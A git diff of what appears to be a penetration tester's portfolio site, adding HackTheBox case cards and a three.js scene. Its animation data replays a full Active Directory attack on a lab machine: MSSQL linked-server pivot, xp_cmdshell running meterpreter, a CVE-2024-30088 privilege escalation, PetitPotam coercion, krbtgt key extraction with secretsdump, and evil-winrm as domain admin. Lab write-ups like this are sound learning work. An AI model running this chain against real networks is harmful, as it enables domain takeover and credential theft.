-          </div>
-        </div>
-
-        <!-- Editor-motif contact form -->
-        <div class="flex-1 min-w-0 lg:min-w-[50%]">
-          <ContactForm id="homeContact" variant="filled" />
-        </div>
-
-      </div>
-    </section>
+    </div>
   </div>
+
+  <div class="roadmap" id="roadmap">
+    <p class="rlabel">The Paper · none held yet</p>
+    <div class="steps">
+      <div class="track"></div>
+      <div class="track-fill" id="trackfill"></div>
+      <div class="step now"><div class="dot"></div><p class="sname">CJCA</p><p class="smeta">Exam booked · HackTheBox</p></div>
+      <div class="step later"><div class="dot"></div><p class="sname">CPTS</p><p class="smeta">Next · HackTheBox</p></div>
+      <div class="step later"><div class="dot"></div><p class="sname">CCNA</p><p class="smeta">Planned · Cisco</p></div>
+    </div>
+    <p class="none-held">This is the order they land in.</p>
+  </div>
+</section>
+
+<!-- ================= ACT III ================= -->
+<section class="record">
+  <p class="eyebrow">The Record · 9 machines</p>
+  <div class="case-grid">
+    <article class="case lead">
+      <span class="wipe"></span><span class="idx">01</span><span class="tier">Hard</span>
+      <h3><a class="stretch" href="darkzero.html">DarkZero</a></h3>
+      <p class="desc">Full Active Directory compromise, replayed step by step. Real commands, real output, the whole foothold chain including what failed first.</p>
+      <p class="tk">Active Directory · HTB · Hard</p>
+    </article>
+    <div class="case-sub-grid">
+      <article class="case">
+        <span class="wipe"></span><span class="idx">02</span><span class="tier">Easy</span>
+        <h3><a class="stretch" href="shocker.html">Shocker</a></h3>
+        <p class="desc">A CGI shell script backed by a vulnerable Bash lets a crafted HTTP header trigger Shellshock (CVE-2014-6271) for RCE. Privesc via a passwordless sudo rule on perl.</p>
+        <p class="tk">linux · web · cgi</p>
+      </article>
+      <article class="case">
+        <span class="wipe"></span><span class="idx">03</span><span class="tier">Easy</span>
+        <h3><a class="stretch" href="kobold.html">Kobold</a></h3>
+        <p class="desc">A wildcard TLS certificate leaks a subdomain running MCPJam Inspector, whose connect endpoint executes commands with no authentication. Privesc via docker group membership.</p>
+        <p class="tk">linux · web · subdomain-enum</p>
+      </article>
+      <article class="case">
+        <span class="wipe"></span><span class="idx">04</span><span class="tier">Easy</span>
+        <h3><a class="stretch" href="cctv.html">CCTV</a></h3>
+        <p class="desc">Default credentials on an exposed ZoneMinder console lead to blind SQL injection (CVE-2024-51482). Root via a loopback-bound motionEye reached over an SSH tunnel (CVE-2025-60787).</p>
+        <p class="tk">linux · web · zoneminder</p>
+      </article>
+    </div>
+  </div>
+</section>
 </BaseLayout>
 
-<style>
-  /* The export's radial mask assumes a wide, short hero. Stacked on a phone the
-     section grows tall and that ellipse shrinks to a patch in the vertical
-     middle, which lands behind the diagram and nowhere else. A vertical fade
-     covers the full column instead, so the field reads as deliberate texture. */
-  @media (max-width: 767px) {
-    .hero-field {
-      -webkit-mask-image: linear-gradient(to bottom, black 0%, black 62%, transparent 100%);
-      mask-image: linear-gradient(to bottom, black 0%, black 62%, transparent 100%);
-    }
-  }
+<style is:global>
+  /* the 3D scene is now the first section rather than the whole page */
+  .hero{position:relative;height:100vh;overflow:hidden}
 
-  /* Scrim: gives the hero copy its own ground so it never competes with the
-     animated field. Soft-edged and generously inset, so it reads as a vignette
-     in the background rather than a panel. `position: relative` also activates
-     the column's z-10, keeping the scrim above the field but under the text. */
-  .hero-copy {
-    position: relative;
-  }
-  .hero-copy::before {
-    content: '';
-    position: absolute;
-    inset: -3rem -4rem -3rem -3rem;
-    z-index: -1;
-    pointer-events: none;
-    background: radial-gradient(
-      ellipse 75% 60% at 30% 45%,
-      rgba(9, 9, 11, 0.94) 0%,
-      rgba(9, 9, 11, 0.82) 45%,
-      rgba(9, 9, 11, 0.45) 68%,
-      transparent 85%
-    );
-  }
-  @media (max-width: 767px) {
-    /* Stacked layout puts the field directly behind every line, so the scrim
-       covers more and sits a touch heavier. */
-    .hero-copy::before {
-      inset: -2rem -1.5rem;
-      background: radial-gradient(
-        ellipse 90% 70% at 50% 50%,
-        rgba(9, 9, 11, 0.96) 0%,
-        rgba(9, 9, 11, 0.88) 55%,
-        rgba(9, 9, 11, 0.5) 75%,
-        transparent 90%
-      );
-    }
-  }
+  #stage{position:absolute;inset:0;z-index:1}
+  #stage canvas{display:block;width:100%;height:100%}
 
-  /* Attack-path graph */
-  .attack-graph { font-family: 'JetBrains Mono', monospace; }
-  .attack-graph :global(.grid-dot) { fill: rgba(255, 255, 255, 0.04); }
-  .attack-graph :global(.edge-primary) { stroke: #4ade80; stroke-width: 1.5; fill: none; }
-  .attack-graph :global(.edge-secondary) {
-    stroke: rgba(255, 255, 255, 0.2); stroke-width: 1; stroke-dasharray: 3 3; fill: none;
-  }
-  .attack-graph :global(.node-rect) { fill: transparent; stroke: rgba(255, 255, 255, 0.15); stroke-width: 1; rx: 2; }
-  .attack-graph :global(.node-rect-accent) { fill: transparent; stroke: #4ade80; stroke-width: 1; rx: 2; }
-  .attack-graph :global(.node-text) { fill: #d4d4d8; text-anchor: middle; dominant-baseline: middle; font-size: 10px; }
-  .attack-graph :global(.node-text-accent) { fill: #4ade80; text-anchor: middle; dominant-baseline: middle; font-size: 10px; }
-  .attack-graph :global(.node-num) { fill: rgba(255, 255, 255, 0.5); font-size: 8px; text-anchor: middle; dominant-baseline: middle; }
-  .attack-graph :global(.node-num-circle) { fill: #0f0f12; stroke: rgba(255, 255, 255, 0.15); stroke-width: 1; }
-  .attack-graph :global(.arrow-primary) { fill: #4ade80; }
-  .attack-graph :global(.arrow-secondary) { fill: rgba(255, 255, 255, 0.2); }
+  #vig{position:absolute;inset:0;z-index:3;pointer-events:none;
+    background:radial-gradient(ellipse 92% 86% at 64% 50%, transparent 20%, rgba(0,0,0,.8) 97%)}
+  #grain{position:absolute;inset:-50%;z-index:4;pointer-events:none;opacity:.06;mix-blend-mode:overlay;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+    animation:g .28s steps(2) infinite}
+  @keyframes g{0%{transform:translate3d(0,0,0)}25%{transform:translate3d(-3%,2%,0)}
+    50%{transform:translate3d(2%,-3%,0)}75%{transform:translate3d(-2%,-2%,0)}100%{transform:translate3d(3%,1%,0)}}
 
-  /* Bento spotlight cards */
-  .spotlight-card {
-    position: relative;
-    background: var(--bg-2);
-    border: 1px solid var(--line);
-    border-radius: 1rem;
-    overflow: hidden;
-  }
-  .spotlight-card::before {
-    content: '';
-    position: absolute;
-    inset: 0;
-    pointer-events: none;
-    opacity: 0;
-    transition: opacity 0.3s ease;
-    background: radial-gradient(
-      800px circle at var(--mouse-x, 50%) var(--mouse-y, 50%),
-      rgba(255, 255, 255, 0.1),
-      transparent 40%
-    );
-    z-index: 1;
-  }
-  .spotlight-card:hover::before { opacity: 1; }
-  /* The export calls this the Border Spotlight: the content sits on its own
-     opaque ground, inset by 1px, so the radial above only shows through that
-     1px ring and reads as a lit edge tracking the cursor. Our first port
-     dropped the margin and the background, which left the gradient washing
-     flatly across the whole card instead. Both are load-bearing. */
-  .spotlight-card > .spotlight-content {
-    position: relative;
-    z-index: 2;
-    height: calc(100% - 2px);
-    margin: 1px;
-    background: inherit;
-    border-radius: inherit;
-  }
+  .copy{position:absolute;left:4vw;top:50%;transform:translateY(-50%);z-index:5;max-width:34vw}
+  .kicker{font-size:.66rem;letter-spacing:.3em;text-transform:uppercase;color:var(--blood);margin:0 0 2.2vh;opacity:0}
+  .strike{margin:0;font-family:var(--display);font-weight:400;text-transform:uppercase;
+    line-height:.84;color:var(--bone)}
+  .strike .ln{display:block;overflow:hidden}
+  .strike .ln .i{display:block;white-space:nowrap;font-size:clamp(1.7rem,4.6vw,3.9rem);transform:translateY(102%)}
+  .strike .ln.crimson .i{color:var(--blood)}
+  .slash{display:block;height:6px;width:min(25vw,300px);margin:2.8vh 0 2.4vh;
+    background:var(--blood);transform:scaleX(0);transform-origin:left}
+  .whoami{margin:0;max-width:44ch;font-size:.88rem;line-height:1.75;color:#a5a19a;opacity:0}
+  .whoami b{color:var(--bone);font-weight:400}
 
-  /* Scanning line. The export referenced an undefined custom property here,
-     so the gradient never rendered; wired to the real accent. */
-  .scan-line {
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 2px;
-    background: linear-gradient(90deg, transparent, #4ade80, transparent);
-    box-shadow: 0 0 10px rgba(74, 222, 128, 0.6);
-    animation: scan 3s linear infinite;
-    opacity: 0.5;
-    z-index: 10;
-  }
-  @keyframes scan {
-    0% { transform: translateY(-100%); }
-    100% { transform: translateY(400px); }
-  }
+  .stagelbl{position:absolute;right:4vw;bottom:6vh;z-index:5;text-align:right;opacity:0}
+  .stagelbl .s{display:block;font-size:.56rem;letter-spacing:.28em;text-transform:uppercase;
+    color:var(--blood);margin-bottom:.6em}
+  .stagelbl .w{display:block;font-size:.78rem;color:#cfcac2}
 
-  @media (prefers-reduced-motion: reduce) {
-    .scan-line { display: none; }
+  .tag{position:absolute;left:4vw;bottom:4vh;z-index:5;font-size:.6rem;letter-spacing:.2em;
+    text-transform:uppercase;color:var(--dimmer)}
+
+  @media(max-width:900px){ .copy{max-width:86vw} .stagelbl{display:none} }
+
+  /* the hero is full-bleed, so the nav floats over it until you scroll */
+  /* z-index sits under #boot (40) so the loading screen stays a clean blackout */
+  .nav{z-index:30;background:transparent;border-bottom-color:transparent}
+
+  /* ---- boot / loading ---- */
+  #boot{position:fixed;inset:0;z-index:40;background:var(--void);
+    display:flex;flex-direction:column;justify-content:center;padding:0 4vw}
+  #boot .bwrap{width:min(34vw,420px)}
+  #boot .bmark{font-family:var(--display);font-weight:400;text-transform:uppercase;
+    font-size:clamp(1.5rem,3.4vw,2.6rem);letter-spacing:.02em;color:var(--bone);margin:0 0 1.6em}
+  #boot .brow{display:flex;justify-content:space-between;align-items:baseline;
+    font-size:.64rem;letter-spacing:.22em;text-transform:uppercase;color:var(--dimmer);margin-bottom:.9em}
+  #boot .bpct{color:var(--blood);font-variant-numeric:tabular-nums}
+  #boot .btrack{height:2px;background:#17151c;position:relative;overflow:hidden}
+  #boot .bfill{position:absolute;inset:0;background:var(--blood);
+    transform:scaleX(0);transform-origin:left;transition:transform .35s cubic-bezier(.2,0,0,1)}
+  #boot .bfile{margin:1.4em 0 0;font-size:.62rem;color:#3f3c37;
+    white-space:nowrap;overflow:hidden;text-overflow:ellipsis;height:1em}
+  /* ================= ACT II ================= */
+  .chapter{position:relative;padding:15vh 4vw;border-top:1px solid var(--line);background:var(--void)}
+  .chapter-head{margin:0 0 8vh;font-family:var(--display);font-weight:400;text-transform:uppercase;
+    font-size:clamp(1.6rem,5.2vw,4.2rem);line-height:.94;max-width:17ch;color:var(--bone)}
+  .chapter-head em{font-style:normal;color:var(--blood-lit)}
+
+  .facts{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);
+    border:1px solid var(--line);margin-bottom:12vh}
+  .fact{background:var(--panel);padding:30px 24px 34px;opacity:0;transform:translateY(20px)}
+  .fact .k{font-size:.58rem;letter-spacing:.24em;text-transform:uppercase;color:var(--blood-lit);margin:0 0 1.6em}
+  .fact .v{margin:0;font-family:var(--display);font-weight:400;text-transform:uppercase;
+    font-size:clamp(.95rem,1.6vw,1.35rem);line-height:1.08;color:var(--bone)}
+  .fact .d{margin:1.2em 0 0;font-size:.84rem;line-height:1.76;color:#a5a19a}
+  .fact .d span{color:var(--dimmer)}
+
+  .twoup{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:12vh;align-items:stretch}
+
+  .codeblock{background:var(--panel);border:1px solid var(--line);overflow:hidden;display:flex;flex-direction:column}
+  .codebar{display:flex;align-items:center;justify-content:space-between;
+    padding:13px 18px;border-bottom:1px solid var(--line);font-size:.62rem;
+    letter-spacing:.16em;text-transform:uppercase;color:var(--dimmer)}
+  .codebar b{color:var(--bone);font-weight:400;letter-spacing:.08em}
+  .code{margin:0;padding:24px 22px;font-size:.74rem;line-height:1.9;color:#9b978f;
+    overflow-x:auto;white-space:pre;flex:1}
+  .code .cl{display:block;opacity:0}
+  .code .kw{color:#c11f1f}
+  .code .fn{color:var(--bone)}
+  .code .st{color:#8a8f7a}
+  .code .cm{color:#403d47}
+  .caret{display:inline-block;width:7px;height:1em;background:var(--blood-lit);
+    vertical-align:-.14em;animation:blink 1.05s steps(1) infinite}
+  @keyframes blink{0%,50%{opacity:1}51%,100%{opacity:0}}
+
+  /* --- HTB stats --- */
+  .htb{background:var(--panel);border:1px solid var(--line);padding:0;display:flex;flex-direction:column}
+  .htb-bar{display:flex;align-items:center;justify-content:space-between;padding:13px 18px;
+    border-bottom:1px solid var(--line);font-size:.62rem;letter-spacing:.16em;text-transform:uppercase;color:var(--dimmer)}
+  .htb-bar b{color:var(--bone);font-weight:400;letter-spacing:.08em}
+  .htb-body{padding:26px 24px 28px;flex:1;display:flex;flex-direction:column;justify-content:space-between}
+  .rankrow{display:flex;align-items:flex-end;justify-content:space-between;gap:16px}
+  .rankname{margin:0;font-family:var(--display);font-weight:400;text-transform:uppercase;
+    font-size:clamp(1.9rem,4vw,3.1rem);line-height:.9;color:var(--bone)}
+  .rankpts{margin:0;text-align:right;font-size:.68rem;letter-spacing:.14em;text-transform:uppercase;color:var(--dimmer)}
+  .rankpts b{display:block;font-family:var(--display);font-size:1.5rem;color:var(--blood-lit);
+    letter-spacing:.02em;margin-bottom:.2em}
+  .progress{margin:1.9em 0 .7em;height:3px;background:#17151c;position:relative;overflow:hidden}
+  .progress i{position:absolute;inset:0;background:var(--blood-lit);transform:scaleX(0);transform-origin:left}
+  .ptext{margin:0;font-size:.64rem;letter-spacing:.1em;color:var(--dimmer)}
+  .htb-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--line);
+    border:1px solid var(--line);margin-top:2.4em}
+  .hcell{background:var(--panel);padding:16px 14px 18px;text-align:center}
+  .hcell .num{margin:0;font-family:var(--display);font-weight:400;font-size:1.6rem;color:var(--bone);line-height:1}
+  .hcell .cap{margin:.7em 0 0;font-size:.55rem;letter-spacing:.16em;text-transform:uppercase;color:var(--dimmer)}
+
+  .roadmap{position:relative;border-top:1px solid var(--line);padding-top:7vh}
+  .roadmap .rlabel{font-size:.6rem;letter-spacing:.22em;text-transform:uppercase;color:var(--blood-lit);margin:0 0 4.4vh}
+  .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:0;position:relative}
+  .track{position:absolute;left:0;right:0;top:9px;height:1px;background:var(--line)}
+  .track-fill{position:absolute;left:0;top:9px;height:1px;background:var(--blood-lit);
+    width:33.33%;transform:scaleX(0);transform-origin:left}
+  .step{position:relative;padding-right:24px;opacity:0}
+  .dot{width:19px;height:19px;border-radius:50%;border:1px solid #2a2733;background:var(--void);position:relative;z-index:2}
+  .step.now .dot{border-color:var(--blood-lit);background:var(--blood-lit);box-shadow:0 0 14px rgba(193,31,31,.6)}
+  .step .sname{margin:2.2em 0 .5em;font-family:var(--display);font-weight:400;text-transform:uppercase;
+    font-size:clamp(1.05rem,2vw,1.6rem);color:var(--bone)}
+  .step.later .sname{color:#63605b}
+  .step .smeta{margin:0;font-size:.7rem;letter-spacing:.14em;text-transform:uppercase;color:var(--dimmer)}
+  .step.now .smeta{color:var(--blood-lit)}
+  .none-held{margin:5.4vh 0 0;font-size:.78rem;color:var(--dimmer)}
+
+  @media(max-width:900px){
+    .facts{grid-template-columns:repeat(2,1fr)}
+    .twoup{grid-template-columns:1fr}
+    .steps{grid-template-columns:1fr;gap:3.4vh}
+    .track,.track-fill{display:none}
+  }
+  @media(max-width:560px){.facts{grid-template-columns:1fr}}
+
+  /* ================= ACT III ================= */
+  .record{padding:14vh 4vw 18vh;border-top:1px solid var(--line);background:var(--void)}
+  .case-grid{display:grid;grid-template-columns:1.15fr 1fr;gap:20px}
+  .case-sub-grid{display:flex;flex-direction:column;gap:20px}
+  .case{position:relative;isolation:isolate;overflow:hidden;background:var(--panel);
+    border:1px solid var(--line);padding:30px 28px;opacity:0;transform:translateY(26px)}
+  .case .wipe{position:absolute;left:0;right:0;top:0;height:2px;background:var(--blood-lit);
+    transform:scaleX(0);transform-origin:left;pointer-events:none}
+  .case.lead{grid-row:span 3;display:flex;flex-direction:column;justify-content:flex-end;min-height:470px}
+  .case.lead::before{content:'';position:absolute;inset:0;pointer-events:none;opacity:0;
+    z-index:-1;transition:opacity 1.2s ease-out;
+    background:radial-gradient(ellipse 66% 60% at 22% 86%, rgba(193,31,31,.17), transparent 72%)}
+  .case.lead.lit::before{opacity:1}
+  .case .idx{position:absolute;top:28px;left:28px;font-size:.64rem;color:var(--dimmer);
+    letter-spacing:.1em;pointer-events:none}
+  .case .tier{position:absolute;top:25px;right:26px;font-size:.56rem;letter-spacing:.22em;
+    text-transform:uppercase;padding:.5em .9em;border:1px solid #2a262f;color:var(--dim);
+    pointer-events:none}
+  .case.lead .tier{color:var(--blood-lit);border-color:#4d1616}
+  .case h3{margin:0;font-family:var(--display);font-weight:400;text-transform:uppercase;
+    line-height:.98;color:var(--bone)}
+  /* the title carries the link and stretches over the tile */
+  .case h3 a.stretch{color:inherit;text-decoration:none}
+  .case h3 a.stretch::after{content:'';position:absolute;inset:0;z-index:3}
+  .case{transition:background .3s}
+  .case:hover{background:#100e14}
+  .case:hover h3{color:var(--bone)}
+  .case:hover .tk{color:var(--blood-lit)}
+  .case.lead h3{font-size:clamp(2rem,4.8vw,3.8rem)}
+  .case:not(.lead) h3{font-size:clamp(1.05rem,1.9vw,1.4rem)}
+  .case .desc{margin:1.1em 0 0;font-size:.85rem;line-height:1.78;color:#a5a19a}
+  .case.lead .desc{max-width:46ch;font-size:.92rem}
+  .case .tk{margin:1.5em 0 0;font-size:.58rem;letter-spacing:.16em;text-transform:uppercase;
+    color:var(--dimmer)}
+
+  @media(max-width:720px){
+    .case-grid{grid-template-columns:1fr}
+    .case.lead{grid-row:auto;min-height:320px}
   }
 </style>
 
 <script>
-  // Spotlight follows the cursor across the bento cards.
-  document.querySelectorAll<HTMLElement>('.spotlight-card').forEach((card) => {
-    card.addEventListener('mousemove', (e) => {
-      const rect = card.getBoundingClientRect();
-      card.style.setProperty('--mouse-x', `${e.clientX - rect.left}px`);
-      card.style.setProperty('--mouse-y', `${e.clientY - rect.top}px`);
-    });
-  });
+import * as THREE from 'three';
+import { RectAreaLightUniformsLib } from 'three/addons/lights/RectAreaLightUniformsLib.js';
+import { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js';
+import { DRACOLoader } from 'three/addons/loaders/DRACOLoader.js';
+import gsap from 'gsap';
+import ScrollTrigger from 'gsap/ScrollTrigger';
+gsap.registerPlugin(ScrollTrigger);
 
+/* ===================== THE REPLAY ===================== */
+const SCRIPT = [
+  {t:'$ impacket-mssqlclient darkzero.htb/john.w@10.129.110.78 -windows-auth', c:'cmd', wait:.7},
+  {t:'[*] Encryption required, switching to TLS', c:'info'},
+  {t:'SQL> SELECT name FROM sys.servers', c:'cmd', wait:.45},
+  {t:'    DC01', c:'out'},
+  {t:'    DC02.darkzero.ext', c:'hot',
+     stage:['01 · Discovery','a linked server reaching into a second domain'], push:.35},
+  {t:'SQL> use_link "DC02.darkzero.ext"', c:'cmd', wait:.5},
+  {t:'[*] Linked to DC02.darkzero.ext', c:'info', ctx:['john.w @ DC02.darkzero.ext','linked · sql',1]},
+  {t:"SQL> sp_configure 'xp_cmdshell', 1; RECONFIGURE;", c:'cmd',
+     stage:['02 · Execution','xp_cmdshell unlocked on the far side'], wait:.4},
+  {t:"SQL> EXEC xp_cmdshell 'C:\\Windows\\Temp\\meterp.exe'", c:'cmd', wait:1.15},
+  {t:'[*] Sending stage (203846 bytes) to 10.129.110.78', c:'info'},
+  {t:'[*] Meterpreter session 1 opened', c:'good',
+     stage:['03 · Foothold','code execution across the domain boundary']},
+  {t:'meterpreter > getuid', c:'cmd', wait:.35},
+  {t:'Server username: darkzero-ext\\svc_sql', c:'out', ctx:['svc_sql @ DC02.darkzero.ext','service account',1]},
+  {t:'meterpreter > .\\winPEASx64.exe', c:'cmd', wait:1.5},
+  {t:'    File: kernel32.dll        CVE-2024-30088', c:'hot',
+     stage:['04 · The flaw','winPEAS flags a kernel race condition'], push:.5},
+  {t:'msf > use exploit/windows/local/cve_2024_30088_authz_basep', c:'cmd', wait:1.1},
+  {t:'[*] Exploit completed, session 2 opened', c:'good'},
+  {t:'meterpreter > getuid', c:'cmd', wait:.3},
+  {t:'Server username: NT AUTHORITY\\SYSTEM', c:'hot',
+     stage:['05 · SYSTEM','local privilege escalation on DC02'],
+     ctx:['SYSTEM @ DC02.darkzero.ext','local system',2], push:.7},
+  {t:'PS > .\\Rubeus.exe monitor /interval:5 /nowrap', c:'cmd', wait:.9},
+  {t:'[*] PetitPotam coercion sent to DC01', c:'info', wait:1.2},
+  {t:'[*] Ticket cache for DC01$ captured', c:'good',
+     stage:['06 · Coercion',"DC01 authenticates, and Rubeus catches its TGT"]},
+  {t:'$ secretsdump.py -k -no-pass -just-dc-user DC01$', c:'cmd', wait:1.6},
+  {t:'krbtgt aes256: 25e1e7b4219c9b41 ... 763c9941', c:'hot',
+     stage:['07 · The key','krbtgt AES key extracted']},
+  {t:'$ ticketer.py -aesKey 25e1e7b4... -domain DARKZERO.HTB DC01$', c:'cmd', wait:.8},
+  {t:'[*] Saving ticket in DC01$.ccache', c:'good'},
+  {t:'$ evil-winrm -i 10.129.90.31 -u Administrator -H 5917507b...', c:'cmd', wait:1.3},
+  {t:'*Evil-WinRM* PS > whoami', c:'cmd', wait:.4},
+  {t:'darkzero\\administrator', c:'hot',
+     stage:['08 · Forest','the whole forest, from one linked server'],
+     ctx:['administrator @ DARKZERO.HTB','domain admin',3], push:1.0},
+  {t:'*Evil-WinRM* PS > type root.txt', c:'cmd', wait:.7},
+  {t:'████████████████████████████████', c:'root', redacted:true},
+];
+const COL = { cmd:'#cfcbc4', info:'#69788a', out:'#87837c',
+              good:'#77a463', hot:'#d4492f', root:'#e8bd80' };
+const PRIV_COL = ['#69788a','#b8942a','#d4492f','#f04a26'];
+
+/* ===================== SCENE ===================== */
+const stageEl = document.getElementById('stage');
+const renderer = new THREE.WebGLRenderer({antialias:true, alpha:true});
+renderer.setPixelRatio(Math.min(devicePixelRatio,2));
+renderer.setClearColor(0x000000,0);
+renderer.toneMapping = THREE.ACESFilmicToneMapping;
+renderer.toneMappingExposure = 1.02;
+renderer.shadowMap.enabled = true;
+// r185 deprecated PCFSoftShadowMap and falls back to PCFShadowMap anyway, so this
+// is the same output without the warning. VSM would keep soft edges but does not
+// support the point light used for the keyboard backlight.
+renderer.shadowMap.type = THREE.PCFShadowMap;
+stageEl.appendChild(renderer.domElement);
+RectAreaLightUniformsLib.init();          // without this RectAreaLight lights nothing correctly
+
+const scene = new THREE.Scene();
+scene.fog = new THREE.FogExp2(0x050406, .036);
+
+const camera = new THREE.PerspectiveCamera(44, 1, .1, 120);
+const CAM_HOME = new THREE.Vector3(1.2, 1.5, 18);
+const LOOK = new THREE.Vector3(0.6, -0.1, 0);
+camera.position.copy(CAM_HOME); camera.lookAt(LOOK);
+
+const room = new THREE.Group();
+room.position.x = 3.8;
+scene.add(room);
+
+/* --- surface texture so nothing reads as flat plastic --- */
+function noiseTex(size=512, amt=26, base=18){
+  const c=document.createElement('canvas'); c.width=c.height=size;
+  const g=c.getContext('2d');
+  const img=g.createImageData(size,size);
+  for(let i=0;i<size*size;i++){
+    const v = base + Math.random()*amt;
+    img.data[i*4]=v; img.data[i*4+1]=v; img.data[i*4+2]=v+2; img.data[i*4+3]=255;
+  }
+  g.putImageData(img,0,0);
+  const t=new THREE.CanvasTexture(c);
+  t.wrapS=t.wrapT=THREE.RepeatWrapping; t.repeat.set(8,8);
+  return t;
+}
+const grainMap = noiseTex();
+
+const deskMat = new THREE.MeshStandardMaterial({
+  color:0x0c0b10, roughness:.9, metalness:.04, roughnessMap:grainMap, bumpMap:grainMap, bumpScale:.012});
+const wallMat = new THREE.MeshStandardMaterial({
+  color:0x0c0b10, roughness:.98, metalness:0, roughnessMap:grainMap});
+const plasticDark = new THREE.MeshStandardMaterial({color:0x0e0d12, roughness:.52, metalness:.28});
+const plasticSoft = new THREE.MeshStandardMaterial({color:0x121118, roughness:.86, metalness:.05});
+const metalMat    = new THREE.MeshStandardMaterial({color:0x2a2d33, roughness:.31, metalness:.85});
+const rubberMat   = new THREE.MeshStandardMaterial({color:0x0b0a0e, roughness:.95, metalness:.02});
+
+const desk = new THREE.Mesh(new THREE.BoxGeometry(46,.5,26), deskMat);
+desk.position.set(0,-2.6,2); desk.receiveShadow = true; room.add(desk);
+const wall = new THREE.Mesh(new THREE.PlaneGeometry(90,54), wallMat);
+wall.position.set(0,6,-8); room.add(wall);
+
+/* ===================== THE MONITOR ===================== */
+const SCR_W = 7.4, SCR_H = 4.4, BEZ = .17;
+const monitor = new THREE.Group(); monitor.position.set(0,.75,0); room.add(monitor);
+
+// back shell, tapered
+const shell = new THREE.Mesh(new THREE.BoxGeometry(SCR_W+BEZ*2-.2, SCR_H+BEZ*2-.2, .42), plasticDark);
+shell.position.z = -.28; shell.castShadow = true; monitor.add(shell);
+// front frame
+const frame = new THREE.Mesh(new THREE.BoxGeometry(SCR_W+BEZ*2, SCR_H+BEZ*2, .14), plasticDark);
+frame.castShadow = true; monitor.add(frame);
+// inner lip catches the panel light
+const lip = new THREE.Mesh(new THREE.BoxGeometry(SCR_W+.04, SCR_H+.04, .06),
+  new THREE.MeshStandardMaterial({color:0x1a1920, roughness:.35, metalness:.5}));
+lip.position.z = .06; monitor.add(lip);
+// power LED
+const led = new THREE.Mesh(new THREE.CircleGeometry(.035,12),
+  new THREE.MeshBasicMaterial({color:0xd4492f}));
+led.position.set(SCR_W/2-.12, -SCR_H/2-BEZ+.07, .085); monitor.add(led);
+// brand mark
+const markCvs = document.createElement('canvas'); markCvs.width=256; markCvs.height=64;
+{ const g=markCvs.getContext('2d'); g.fillStyle='rgba(0,0,0,0)'; g.fillRect(0,0,256,64);
+  g.font='600 30px "Cascadia Code", Consolas, monospace'; g.fillStyle='#3a3841';
+  g.textBaseline='middle'; g.fillText('CERTIFA', 8, 34); }
+const mark = new THREE.Mesh(new THREE.PlaneGeometry(1.25,.31),
+  new THREE.MeshBasicMaterial({map:new THREE.CanvasTexture(markCvs), transparent:true}));
+mark.position.set(-SCR_W/2+.66, -SCR_H/2-BEZ+.07, .085); monitor.add(mark);
+
+// stand
+const neck = new THREE.Mesh(new THREE.BoxGeometry(.42,1.6,.34), plasticDark);
+neck.position.set(0,-SCR_H/2-1.0,-.18); neck.castShadow=true; monitor.add(neck);
+const foot = new THREE.Mesh(new THREE.CylinderGeometry(1.5,1.6,.12,28), metalMat);
+foot.position.set(0,-SCR_H/2-1.78,.05); foot.castShadow=true; monitor.add(foot);
+
+// the panel
+const CW = 1400, CH = 840;
+const cvs = document.createElement('canvas'); cvs.width=CW; cvs.height=CH;
+const ctx = cvs.getContext('2d');
+const screenTex = new THREE.CanvasTexture(cvs);
+screenTex.colorSpace = THREE.SRGBColorSpace;
+const screen = new THREE.Mesh(new THREE.PlaneGeometry(SCR_W, SCR_H),
+  new THREE.MeshBasicMaterial({map:screenTex, toneMapped:false}));
+screen.position.z = .1; monitor.add(screen);
+
+// glass sheen: a faint reflection of the room, sells "screen" over "plane"
+const sheenCvs = document.createElement('canvas'); sheenCvs.width=256; sheenCvs.height=256;
+{ const g=sheenCvs.getContext('2d');
+  const grd=g.createLinearGradient(0,0,256,256);
+  grd.addColorStop(0,'rgba(190,205,225,.10)'); grd.addColorStop(.42,'rgba(190,205,225,.02)');
+  grd.addColorStop(.58,'rgba(0,0,0,0)'); grd.addColorStop(1,'rgba(160,180,205,.05)');
+  g.fillStyle=grd; g.fillRect(0,0,256,256); }
+const glass = new THREE.Mesh(new THREE.PlaneGeometry(SCR_W, SCR_H),
+  new THREE.MeshBasicMaterial({map:new THREE.CanvasTexture(sheenCvs),
+    transparent:true, blending:THREE.AdditiveBlending, depthWrite:false}));
+glass.position.z = .11; monitor.add(glass);
+
+/* --- second screen, off to the side, dim --- */
+const scr2 = new THREE.Group();
+scr2.position.set(6.9,.15,-3.6); scr2.rotation.y = -0.52; room.add(scr2);
+scr2.add(new THREE.Mesh(new THREE.BoxGeometry(5.0,3.1,.22), plasticDark));
+const s2c = document.createElement('canvas'); s2c.width=512; s2c.height=320;
+{ const g=s2c.getContext('2d'); g.fillStyle='#070910'; g.fillRect(0,0,512,320);
+  g.strokeStyle='#1d3348'; g.lineWidth=1;
+  const nodes=[[90,80],[210,140],[330,70],[400,200],[160,250],[300,240],[440,120]];
+  nodes.forEach((a,i)=>nodes.forEach((b,j)=>{ if(i<j && Math.random()>.55){
+    g.beginPath(); g.moveTo(a[0],a[1]); g.lineTo(b[0],b[1]); g.stroke(); }}));
+  nodes.forEach(n=>{ g.fillStyle='#2b4a63'; g.beginPath(); g.arc(n[0],n[1],5,0,7); g.fill(); });
+  g.fillStyle='#31536e'; g.font='11px monospace'; g.fillText('BloodHound · darkzero.htb', 14, 300); }
+const scr2panel = new THREE.Mesh(new THREE.PlaneGeometry(4.7,2.85),
+  new THREE.MeshBasicMaterial({map:new THREE.CanvasTexture(s2c), toneMapped:false}));
+scr2panel.position.z=.12; scr2.add(scr2panel);
+const scr2Light = new THREE.PointLight(0x3a5f80, 2.2, 12, 2.2);
+scr2Light.position.set(6.6,.3,-1.6); room.add(scr2Light);
+
+/* ===================== DESK OBJECTS ===================== */
+// mouse
+const mouse3d = new THREE.Mesh(new THREE.SphereGeometry(.42,20,14), plasticSoft);
